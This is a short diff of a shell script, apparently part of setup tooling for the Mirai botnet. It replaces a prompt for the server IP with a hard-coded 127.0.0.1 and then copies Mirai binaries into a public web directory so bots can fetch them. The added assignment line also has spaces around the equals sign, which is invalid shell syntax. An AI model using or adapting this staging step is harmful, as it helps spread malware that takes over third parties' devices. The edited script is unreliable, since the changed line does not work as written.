@@ -1,4 +1,4 @@
-read -p "Web server ip: " SERVER_IP
+SERVER_IP = "127.0.0.1"
 
 mkdir /var/www/html/bins
 cp mirai* /var/www/html/bins
